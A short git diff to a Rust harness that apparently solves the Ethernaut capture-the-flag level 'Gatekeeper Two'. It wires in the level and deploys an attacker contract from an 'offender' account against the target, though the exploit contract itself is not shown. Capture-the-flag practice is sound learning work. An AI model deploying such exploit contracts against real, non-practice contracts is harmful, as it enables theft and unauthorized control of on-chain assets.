@@ -1,5 +1,6 @@
+use crate::abi::gatexploit_two::GatexploitTwo;
 use async_trait::async_trait;
-use ctf::ethernaut::lvlREPLACEME::*;
+use ctf::ethernaut::lvl14_gatekeeper_two::*;
 use ethers::prelude::*;
 
 pub(crate) struct Exploit;
@@ -13,6 +14,11 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        // let gatexploit_two =
+        GatexploitTwo::deploy(offender.to_owned(), target.address)?
+            .send()
+            .await?;
+
         Ok(())
     }
 }
